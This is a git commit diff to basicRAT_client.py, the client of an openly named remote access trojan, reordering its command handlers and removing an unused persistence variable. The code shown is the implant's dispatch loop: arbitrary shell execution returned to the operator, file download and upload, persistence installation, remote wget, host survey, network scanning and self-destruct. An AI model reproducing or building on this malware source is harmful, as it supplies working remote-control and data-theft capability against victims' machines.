af95e7fc5a56832ff0ddf65c63432fabd8027621
Austin Jackson <austinjackson892@gmail.com>
2017-02-23 15:13:00 +0000

    Remote unused persistence_applied variable, and alphabetize commands.

--- basicRAT_client.py
+++ basicRAT_client.py
@@ -38,47 +38,29 @@ def main():
         if not data:
             continue
 
-        # seperate prompt into command and action
+        # seperate data into command and action
         cmd, _, action = data.partition(' ')
 
-        # kill client
-        if cmd == 'kill':
-            conn.close()
-            sys.exit(0)
+        if cmd == 'download':
+            client.sendfile(action.rstrip())
+            continue
 
-        # regenerate DH key
-        # elif cmd == 'rekey':
-        #    client.dh_key = crypto.diffiehellman(client.conn)
-        #    continue
-
-        # run a command
         elif cmd == 'execute':
             results = subprocess.Popen(action, shell=True,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       stdin=subprocess.PIPE)
             results = results.stdout.read() + results.stderr.read()
 
-        elif cmd == 'download':
-            client.sendfile(action.rstrip())
-            continue
-
-        elif cmd == 'upload':
-            client.recvfile(action.rstrip())
-            continue
+        elif cmd == 'kill':
+            conn.close()
+            sys.exit(0)
 
         elif cmd == 'persistence':
             results = persistence.run(plat)
-            if 'unsuccessful' not in results:
-                persistence_applied = True
 
-        elif cmd == 'wget':
-            results = toolkit.wget(action)
-
-        elif cmd == 'unzip':
-            results = toolkit.unzip(action)
-
-        elif cmd == 'survey':
-            results = survey.run(plat)
+        # elif cmd == 'rekey':
+        #    client.dh_key = crypto.diffiehellman(client.conn)
+        #    continue
 
         elif cmd == 'scan':
             results = scan.single_host(action)
@@ -86,6 +68,19 @@ def main():
         elif cmd == 'selfdestruct':
             conn.close()
             toolkit.selfdestruct(plat)
+
+        elif cmd == 'survey':
+            results = survey.run(plat)
+
+        elif cmd == 'unzip':
+            results = toolkit.unzip(action)
+
+        elif cmd == 'upload':
+            client.recvfile(action.rstrip())
+            continue
+
+        elif cmd == 'wget':
+            results = toolkit.wget(action)
 
         client.sendGCM(results)
 
